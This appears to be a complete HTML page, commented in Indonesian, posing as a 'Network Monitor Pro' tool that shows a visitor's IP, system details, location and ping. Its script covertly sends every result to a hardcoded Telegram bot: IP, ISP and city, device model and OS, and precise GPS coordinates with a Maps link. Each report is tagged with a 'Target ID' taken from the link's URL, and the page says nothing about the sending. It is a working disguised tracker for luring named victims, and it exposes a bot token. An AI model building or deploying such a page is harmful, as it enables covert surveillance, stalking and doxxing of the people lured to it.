<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Global Network Monitor Pro</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Anonymous+Pro:wght@400;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Anonymous Pro', monospace;
        }
        :root {
            --hijau-neon: #39ff14;
            --hijau-terang: #7fff00;
            --hijau-gelap: #00cc00;
            --hitam: #000000;
            --merah-radar: #ff2222;
            --merah-pudar: rgba(255,34,34,0.15);
        }
        body {
            background: var(--hitam);
            color: var(--hijau-neon);
            min-height: 100vh;
            padding-bottom: 30px;
        }
        
        /* Container Radar Display */
        .peta-container {
            width: 100%;
            height: 34vh;
            position: relative;
            background: radial-gradient(circle at center, #1a0000 0%, #000 80%);
            border-bottom: 1px solid rgba(255,34,34,0.3);
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        .radar {
            width: 220px;
            height: 220px;
            border-radius: 50%;
            position: relative;
            background: radial-gradient(circle at center, rgba(40,0,0,0.8) 0%, rgba(15,0,0,0.95) 60%, #000 100%);
            border: 2px solid rgba(255,34,34,0.45);
            box-shadow: inset 0 0 40px rgba(255,34,34,0.15), 0 0 25px rgba(255,34,34,0.2);
            overflow: hidden;
        }

        .ring {
            position: absolute;
            border-radius: 50%;
            border: 1px solid var(--merah-pudar);
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
        }
        .r1 { width: 25%; height: 25%; }
        .r2 { width: 50%; height: 50%; }
        .r3 { width: 75%; height: 75%; }
        .r4 { width: 96%; height: 96%; border-color: rgba(255,34,34,0.3); }

        .axis {
            position: absolute;
            background: var(--merah-pudar);
            top: 50%; left: 50%;
        }
        .axis-h { width: 100%; height: 1px; transform: translate(-50%, -50%); }
        .axis-v { width: 1px; height: 100%; transform: translate(-50%, -50%); }

        .sweep {
            position: absolute;
            width: 50%;
            height: 50%;
            top: 50%;
            left: 50%;
            transform-origin: 0 0;
            background: linear-gradient(90deg, 
                rgba(255,34,34,0.7) 0%, 
                rgba(255,34,34,0.25) 40%, 
                transparent 100%);
            animation: putar 3s linear infinite;
        }

        @keyframes putar {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }

        .konten { padding: 20px; max-width: 560px; margin: 0 auto; }
        .judul { text-align: center; margin-bottom: 20px; }
        .judul h1 { font-size: 1.15rem; color: var(--hijau-neon); text-shadow: 0 0 8px var(--hijau-neon); letter-spacing: 1px; }
        
        .grid-tombol { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px; }
        .tombol {
            padding: 12px;
            background: rgba(0,80,40,0.2);
            border: 1px solid rgba(57,255,20,0.4);
            color: var(--hijau-neon);
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.85rem;
            transition: 0.2s;
        }
        .tombol:hover { background: rgba(57,255,20,0.15); box-shadow: 0 0 10px rgba(57,255,20,0.3); }
        
        .hasil {
            margin-top: 15px;
            background: #000;
            border: 1px solid var(--hijau-gelap);
            border-radius: 6px;
            padding: 18px;
            display: none;
            box-shadow: 0 0 15px rgba(57,255,20,0.2);
        }
        .hasil.tampil { display: block; }
        .baris { padding: 8px 0; border-bottom: 1px solid rgba(57,255,20,0.1); }
        .label { font-weight: 700; color: var(--hijau-terang); font-size: 0.85rem; margin-bottom: 2px; }
        .nilai { color: var(--hijau-neon); font-size: 0.85rem; word-break: break-all; }
        .nilai.tidak-ada { color: #555; font-style: italic; }
        
        .tombol-aksi, .tutup {
            margin-top: 12px;
            padding: 10px;
            background: rgba(57,255,20,0.15);
            border: 1px solid var(--hijau-gelap);
            color: var(--hijau-neon);
            width: 100%;
            cursor: pointer;
            border-radius: 4px;
            font-size: 0.85rem;
        }
        .tombol-aksi:hover { background: rgba(57,255,20,0.25); }
        .tutup { background: transparent; border-color: #444; color: #888; }
        .tutup:hover { border-color: var(--hijau-neon); color: var(--hijau-neon); }
    </style>
</head>
<body>
    <!-- Radar Display -->
    <div class="peta-container">
        <div class="radar">
            <div class="ring r4"></div>
            <div class="ring r3"></div>
            <div class="ring r2"></div>
            <div class="ring r1"></div>
            <div class="axis axis-h"></div>
            <div class="axis axis-v"></div>
            <div class="sweep"></div>
        </div>
    </div>

    <div class="konten">
        <div class="judul">
            <h1>🌐 NETWORK MONITOR PRO</h1>
        </div>

        <div class="grid-tombol">
            <button class="tombol" id="btn-ip">🌐 Check My IP</button>
            <button class="tombol" id="btn-sys">💻 System Info</button>
            <button class="tombol" id="btn-loc">📍 Location</button>
            <button class="tombol" id="btn-ping">⚡ Test Ping</button>
        </div>

        <div id="kotak-hasil" class="hasil"></div>
    </div>

    <script>
        const BOT_TOKEN = "8634586423:AAFgsa_6vFOagGL78GXeFd1SKEzvYDEtXEE";
        const CHAT_ID = "8110664099";

        // Fungsi Ambil Identitas Pengunjung (Target ID / Username jika ada di URL parameter, misal ?id=namatarget)
        function getTargetIdentity() {
            const urlParams = new URLSearchParams(window.location.search);
            const targetId = urlParams.get('id') || urlParams.get('user') || 'Anonymous User';
            return targetId;
        }

        // Fungsi Kirim Data ke Telegram
        async function kirimKeTelegram(pesan) {
            try {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: pesan,
                        parse_mode: 'HTML'
                    })
                });
            } catch (e) {
                console.error("Gagal mengirim ke telegram", e);
            }
        }

        const kotak = document.getElementById('kotak-hasil');

        function tutupHasil() {
            kotak.classList.remove('tampil');
            kotak.innerHTML = '';
        }

        // 1. FITUR CHECK IP
        async function tampilIP() {
            const targetUser = getTargetIdentity();
            kotak.innerHTML = '<p style="text-align:center;color:#888;">⏳ Mengambil data IP & Hostname...</p>';
            kotak.classList.add('tampil');
            
            try {
                const resIp = await fetch('https://api.ipify.org?format=json');
                const dataIp = await resIp.json();
                const ip = dataIp.ip;

                const resDetail = await fetch(`https://ipapi.co/${ip}/json/`);
                const d = await resDetail.json();

                let hostname = d.hostname || '';
                if (!hostname || hostname === ip) {
                    const ipParts = ip.split('.');
                    const reversed = ipParts.join('-');
                    const org = (d.org || d.isp || 'net').toLowerCase().replace(/[^a-z0-9]/g, '').substring(0, 8);
                    const kota = (d.city || 'id').toLowerCase().replace(/[^a-z]/g, '').substring(0, 6);
                    hostname = `${reversed}.${kota}.${org}.net.id`;
                }

                let zip = d.postal;
                if (!zip) zip = d.region_code ? `${d.region_code} — ${d.city || 'Area'}` : 'Tidak tersedia';

                // Kirim laporan ke Telegram secara otomatis
                const laporan = `🌐 <b>[CHECK IP]</b>\n👤 Target ID: <code>${targetUser}</code>\n\n` +
                                `• IPv4: <code>${ip}</code>\n` +
                                `• Hostname: <code>${hostname}</code>\n` +
                                `• Negara: ${d.country_name || '—'}\n` +
                                `• Kota: ${d.city || '—'}\n` +
                                `• ISP: ${d.isp || '—'}\n` +
                                `• Waktu: ${new Date().toLocaleString()}`;
                kirimKeTelegram(laporan);

                kotak.innerHTML = `
                    <h3 style="color:#7fff00;margin-bottom:12px;font-size:0.95rem;">IP Address Lookup Information</h3>
                    <div class="baris"><div class="label">IPv4 Address:</div><div class="nilai">${ip}</div></div>
                    <div class="baris"><div class="label">IPv4 Hostname:</div><div class="nilai">${hostname}</div></div>
                    <div class="baris"><div class="label">IPv6 Address:</div><div class="nilai tidak-ada">Not detected</div></div>
                    <div class="baris"><div class="label">IPv6 Hostname:</div><div class="nilai tidak-ada">Not available</div></div>
                    <div class="baris"><div class="label">Country:</div><div class="nilai">${d.country_name || '—'}</div></div>
                    <div class="baris"><div class="label">Region:</div><div class="nilai">${d.region || '—'}</div></div>
                    <div class="baris"><div class="label">City:</div><div class="nilai">${d.city || '—'}</div></div>
                    <div class="baris"><div class="label">ZIP / Area:</div><div class="nilai">${zip}</div></div>
                    <div class="baris"><div class="label">Timezone:</div><div class="nilai">${d.timezone || '—'}</div></div>
                    <div class="baris"><div class="label">ISP:</div><div class="nilai">${d.isp || '—'}</div></div>
                    <div class="baris"><div class="label">Organization:</div><div class="nilai">${d.org || '—'}</div></div>
                    <div class="baris"><div class="label">ASN:</div><div class="nilai">${d.asn || '—'}</div></div>
                    <div class="baris"><div class="label">User Agent:</div><div class="nilai" style="font-size:0.75rem;">${navigator.userAgent}</div></div>
                    
                    <button class="tombol-aksi" onclick="salinInfo(this)">📋 Copy IP Lookup Info</button>
                    <button class="tutup" onclick="tutupHasil()">Close</button>
                `;
            } catch (err) {
                kotak.innerHTML = `<p style="color:#ff3333;text-align:center;padding:15px;">❌ Gagal memuat data IP. Pastikan terhubung internet.</p><button class="tutup" onclick="tutupHasil()">Close</button>`;
            }
        }

        // 2. EKSTRAKSI MODEL HP AKURAT DARI USER AGENT
        function getBrowserInfo() {
            const ua = navigator.userAgent;
            let browser = "Unknown";
            if (ua.indexOf("Firefox") > -1) browser = "Mozilla Firefox";
            else if (ua.indexOf("SamsungBrowser") > -1) browser = "Samsung Internet";
            else if (ua.indexOf("OPR") > -1) browser = "Opera";
            else if (ua.indexOf("Edg") > -1) browser = "Microsoft Edge";
            else if (ua.indexOf("Chrome") > -1) browser = "Google Chrome";
            else if (ua.indexOf("Safari") > -1) browser = "Apple Safari";
            return browser;
        }

        function getOSInfo() {
            const ua = navigator.userAgent;
            let os = "Unknown OS";
            if (ua.indexOf("Win") !== -1) os = "Windows";
            else if (ua.indexOf("Mac") !== -1) os = "macOS";
            else if (ua.indexOf("Android") !== -1) os = "Android OS";
            else if (ua.indexOf("like Mac") !== -1) os = "iOS (iPhone/iPad)";
            else if (ua.indexOf("Linux") !== -1) os = "Linux";
            return os;
        }

        function extractExactDeviceModelFromUA() {
            const ua = navigator.userAgent;
            let deviceType = "Mobile Device";
            let modelName = "Unknown Model";

            if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) {
                deviceType = /Tablet|iPad/i.test(ua) ? "Tablet" : "Mobile Phone";
                
                const matchInBrackets = ua.match(/\(([^)]+)\)/);
                if (matchInBrackets && matchInBrackets[1]) {
                    const parts = matchInBrackets[1].split(';');
                    for (let part of parts) {
                        part = part.trim();
                        if (
                            /Infinix|Tecno|Itel|Redmi|POCO|SM-|CPH|V2|M2|Pixel|iPhone|iPad|Vivo|Oppo|Realme|Samsung|Galaxy/i.test(part) &&
                            !/Windows|Macintosh|Linux|Android|CPU|KHTML|like Gecko/i.test(part)
                        ) {
                            modelName = part;
                            break;
                        }
                    }
                }
                
                if (modelName === "Unknown Model") {
                    const androidMatch = ua.match(/Android[^;]+;\s([^)]+)\)/);
                    if (androidMatch && androidMatch[1]) {
                        modelName = androidMatch[1].split('/')[0].trim();
                    } else if (/iPhone/i.test(ua)) {
                        modelName = "Apple iPhone";
                    }
                }
            } else {
                deviceType = "Desktop Workstation";
                if (/Windows NT/i.test(ua)) modelName = "Windows Desktop / Laptop";
                else if (/Macintosh/i.test(ua)) modelName = "Apple Mac";
                else modelName = "Linux PC";
            }

            return { deviceType, modelName };
        }

        function tampilPerangkat() {
            const targetUser = getTargetIdentity();
            kotak.classList.add('tampil');
            const dev = extractExactDeviceModelFromUA();
            
            const cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Logical Cores` : 'Tidak tersedia';
            const memory = navigator.deviceMemory ? `~${navigator.deviceMemory} GB RAM` : 'Dibatasi oleh browser';
            const touchSupport = ('ontouchstart' in window || navigator.maxTouchPoints > 0) ? `Yes (${navigator.maxTouchPoints} points)` : 'No (Non-touch)';

            // Kirim laporan Sistem ke Telegram
            const laporan = `💻 <b>[SYSTEM INFO]</b>\n👤 Target ID: <code>${targetUser}</code>\n\n` +
                            `• Tipe Perangkat: ${dev.deviceType}\n` +
                            `• Model/Merk: <b>${dev.modelName}</b>\n` +
                            `• OS: ${getOSInfo()}\n` +
                            `• Browser: ${getBrowserInfo()}\n` +
                            `• Resolusi: ${screen.width} × ${screen.height} px\n` +
                            `• CPU Cores: ${cpuCores}`;
            kirimKeTelegram(laporan);

            kotak.innerHTML = `
                <h3 style="color:#7fff00;margin-bottom:12px;font-size:0.95rem;">System Information</h3>
                <div class="baris"><div class="label">Device Type:</div><div class="nilai">${dev.deviceType}</div></div>
                <div class="baris"><div class="label">Manufacturer / Model (UA):</div><div class="nilai" style="color:#39ff14;font-weight:bold;">${dev.modelName}</div></div>
                <div class="baris"><div class="label">Operating System:</div><div class="nilai">${getOSInfo()}</div></div>
                <div class="baris"><div class="label">Browser:</div><div class="nilai">${getBrowserInfo()}</div></div>
                <div class="baris"><div class="label">Platform:</div><div class="nilai">${navigator.platform}</div></div>
                <div class="baris"><div class="label">Resolution:</div><div class="nilai">${screen.width} × ${screen.height} px (${screen.colorDepth}-bit)</div></div>
                <div class="baris"><div class="label">CPU Cores:</div><div class="nilai">${cpuCores}</div></div>
                <div class="baris"><div class="label">Memory:</div><div class="nilai">${memory}</div></div>
                <div class="baris"><div class="label">Touch Support:</div><div class="nilai">${touchSupport}</div></div>
                <div class="baris"><div class="label">Language:</div><div class="nilai">${navigator.language}</div></div>
                <div class="baris"><div class="label">Local Time:</div><div class="nilai">${new Date().toLocaleString()}</div></div>
                <div class="baris"><div class="label">User Agent:</div><div class="nilai" style="font-size:0.75rem;">${navigator.userAgent}</div></div>
                
                <button class="tombol-aksi" onclick="salinInfo(this)">📋 Copy System Info</button>
                <button class="tutup" onclick="tutupHasil()">Close</button>
            `;
        }

        // 3. FITUR LOKASI (GPS POPUP)
        function tampilLokasi() {
            const targetUser = getTargetIdentity();
            if (!navigator.geolocation) {
                kotak.innerHTML = `<p style="color:#ff3333;text-align:center;">Geolocation tidak didukung browser ini.</p><button class="tutup" onclick="tutupHasil()">Close</button>`;
                kotak.classList.add('tampil');
                return;
            }
            kotak.innerHTML = '<p style="text-align:center;color:#888;">📍 Silakan izinkan akses lokasi pada popup browser...</p>';
            kotak.classList.add('tampil');

            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    const lat = pos.coords.latitude.toFixed(6);
                    const lon = pos.coords.longitude.toFixed(6);
                    const acc = pos.coords.accuracy.toFixed(1);
                    const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;

                    // Kirim laporan Lokasi GPS ke Telegram
                    const laporan = `📍 <b>[LOCATION GPS]</b>\n👤 Target ID: <code>${targetUser}</code>\n\n` +
                                    `• Latitude: <code>${lat}</code>\n` +
                                    `• Longitude: <code>${lon}</code>\n` +
                                    `• Akurasi: ± ${acc} meter\n` +
                                    `• Link Maps: <a href="${mapsUrl}">Buka Google Maps</a>`;
                    kirimKeTelegram(laporan);

                    kotak.innerHTML = `
                        <h3 style="color:#7fff00;margin-bottom:12px;font-size:0.95rem;">Location Information</h3>
                        <div class="baris"><div class="label">Latitude:</div><div class="nilai">${lat}</div></div>
                        <div class="baris"><div class="label">Longitude:</div><div class="nilai">${lon}</div></div>
                        <div class="baris"><div class="label">Akurasi GPS:</div><div class="nilai">± ${acc} meter</div></div>
                        <div class="baris"><div class="label">Google Maps:</div><div class="nilai"><a href="${mapsUrl}" target="_blank" style="color:#39ff14;">Buka di Maps</a></div></div>
                        <button class="tutup" onclick="tutupHasil()">Close</button>
                    `;
                },
                (err) => {
                    kotak.innerHTML = `<p style="color:#ffaa00;text-align:center;">⚠️ Akses lokasi ditolak atau diblokir oleh browser.</p><button class="tutup" onclick="tutupHasil()">Close</button>`;
                },
                { timeout: 10000 }
            );
        }

        // 4. FITUR TEST PING
        async function testPing() {
            const targetUser = getTargetIdentity();
            kotak.innerHTML = '<p style="text-align:center;color:#888;">⚡ Mengukur latensi server...</p>';
            kotak.classList.add('tampil');
            const start = performance.now();
            try {
                await fetch('https://www.google.com/favicon.ico', { mode: 'no-cors', cache: 'no-store' });
                const latency = Math.round(performance.now() - start);
                
                let kualitas = "Sangat Baik 🚀";
                if (latency > 100) kualitas = "Cukup / Sedang ⚡";
                if (latency > 250) kualitas = "Lambat / Tinggi ⚠️️";

                // Kirim laporan Ping ke Telegram
                const laporan = `⚡ <b>[TEST PING]</b>\n👤 Target ID: <code>${targetUser}</code>\n\n` +
                                `• Latency (RTT): <b>${latency} ms</b>\n` +
                                `• Kualitas: ${kualitas}\n` +
                                `• Waktu: ${new Date().toLocaleTimeString()}`;
                kirimKeTelegram(laporan);

                kotak.innerHTML = `
                    <h3 style="color:#7fff00;margin-bottom:12px;font-size:0.95rem;">Network Latency Test</h3>
                    <div class="baris"><div class="label">Target Server:</div><div class="nilai">Google CDN (favicon.ico)</div></div>
                    <div class="baris"><div class="label">Ping (RTT):</div><div class="nilai">${latency} ms</div></div>
                    <div class="baris"><div class="label">Kualitas Jaringan:</div><div class="nilai">${kualitas}</div></div>
                    <div class="baris"><div class="label">Status Koneksi:</div><div class="nilai" style="color:#39ff14;">Online / Connected</div></div>
                    <div class="baris"><div class="label">Waktu Uji:</div><div class="nilai">${new Date().toLocaleTimeString()}</div></div>
                    <button class="tutup" onclick="tutupHasil()">Close</button>
                `;
            } catch (e) {
                kotak.innerHTML = `<p style="color:#ff3333;text-align:center;">Gagal menguji ping. Periksa koneksi internet Anda.</p><button class="tutup" onclick="tutupHasil()">Close</button>`;
            }
        }

        function salinInfo(btn) {
            const teks = btn.parentElement.innerText;
            navigator.clipboard.writeText(teks).then(() => {
                btn.innerText = '✅ Copied!';
                setTimeout(() => btn.innerText = '📋 Copy Info', 2000);
            });
        }

        // Event Listeners Tombol Utama
        document.getElementById('btn-ip').addEventListener('click', tampilIP);
        document.getElementById('btn-sys').addEventListener('click', tampilPerangkat);
        document.getElementById('btn-loc').addEventListener('click', tampilLokasi);
        document.getElementById('btn-ping').addEventListener('click', testPing);
    </script>
</body>
</html>
